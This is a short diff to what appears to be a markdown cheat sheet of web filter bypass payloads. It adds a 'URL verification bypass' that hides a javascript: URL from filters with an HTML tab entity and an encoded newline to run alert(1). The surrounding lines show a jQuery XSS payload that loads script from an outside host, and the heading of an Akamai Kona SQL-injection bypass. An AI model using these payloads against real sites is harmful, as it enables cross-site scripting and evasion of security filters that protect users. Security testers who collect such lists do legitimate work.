@@ -40,6 +40,12 @@ Note: This kind of depends on what security level the application is set to. See
 $.get('http://sakurity.com/jqueryxss')
 ```
 
+**URL verification bypasses (works without `&#x09;` too)**
+
+```html
+javas&#x09;cript://www.google.com/%0Aalert(1)
+```
+
 ## SQLI
 
 **Akamai Kona Bypass**
